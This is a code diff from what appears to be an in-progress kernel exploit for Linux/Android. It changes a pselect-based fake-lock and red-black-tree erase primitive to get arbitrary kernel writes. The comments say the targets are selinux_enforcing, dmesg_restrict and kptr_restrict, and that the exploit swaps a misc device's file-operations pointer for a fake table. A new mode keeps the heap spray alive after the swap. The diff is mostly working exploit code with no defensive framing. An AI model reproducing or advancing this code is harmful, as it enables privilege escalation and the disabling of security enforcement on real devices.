@@ -873,23 +873,27 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     (unsigned long long)tree_l);
           } else if (env_flag("MODE4_SLIDE_ZERO", 0)) {
             /*
-             * SLIDE_ZERO: write VALUE=0 to DATAONLY_TARGET using the
-             * PROVEN SLIDE mechanism (tree_pc=0, tree_left=target).
-             * The erase writes *target = 0. Parent=NULL → change_child
-             * updates root->rb_node (harmless scratch). For
-             * selinux_enforcing=0, dmesg_restrict=0, kptr_restrict=0.
+             * SLIDE_ZERO / JoinChang W1 / emerald NULL:
+             * Leaf under parent=target-8 (red). __rb_change_child's
+             * else branch writes NULL into parent->rb_right == *target.
+             * tree_pc=0 + left=target (old) set lock.waiters=target → KP
+             * (Z2/Z3). Color red so rb_erase_color is skipped.
              */
-            tree_pc = 0;
-            tree_r = 0;
-            tree_l = (uint64_t)pselect_write_target();
-            pi_parent = 0;
-            pi_right = 0;
-            pi_left = 0;
-            stack_lock = fake_lock;
-            stack_prio = 3;
-            stack_deadline = 0;
-            pr_info("stack mode4 SLIDE_ZERO: *%016llx = 0\n",
-                    (unsigned long long)tree_l);
+            {
+              uint64_t ztgt = (uint64_t)pselect_write_target();
+              tree_pc = (ztgt - 8) & ~1ULL;
+              tree_r = 0;
+              tree_l = 0;
+              pi_parent = 0;
+              pi_right = 0;
+              pi_left = 0;
+              stack_lock = fake_lock;
+              stack_prio = 3;
+              stack_deadline = 0;
+              pr_info("stack mode4 SLIDE_ZERO: parent=%016llx-8 leaf "
+                      "→ *%016llx = 0\n",
+                      (unsigned long long)ztgt, (unsigned long long)ztgt);
+            }
           } else if (env_flag("MODE4_SLIDE_SWAP", 0)) {
             /*
              * THE SWAP: write fake_fops to P0(MISC.fops) using the
@@ -1835,6 +1839,22 @@ void do_pselect_fake_lock_route(void) {
         /* Bisect: swap landed, deliberately never open ashmem. */
         pr_info("SWAP_NOCFI: skipping post-walk cfi probe\n");
         route_verified = 1;
+        if (env_flag("MODE4_SWAP_HOLD", 0)) {
+          /* N7: classify ALIVE then delayed SOFTBOOT after process exit
+           * freed the SKB page while *MISC.fops still pointed at it.
+           * Stay alive so spray fds/pages remain valid for swap_probe. */
+          pr_info("SWAP_HOLD: spray live fake_fops=%016zx pid=%d — not exiting\n",
+                  fake_fops, getpid());
+          live_sync_log("STAGE", "swap_hold");
+          durable_proof_log("swap_hold");
+          fflush(stdout);
+          fsync(STDOUT_FILENO);
+          /* Let main continue (SLIDE_ZERO selinux). Do NOT open ashmem —
+           * N11/N12 died in open() through the swapped table. */
+          atomic_store(&route_done, 1);
+          for (;;)
+            sleep(30);
+        }
       } else if (pselect_custom_write_enabled()) {
         cfi_last_step = 0;
         cfi_last_errno = 0;
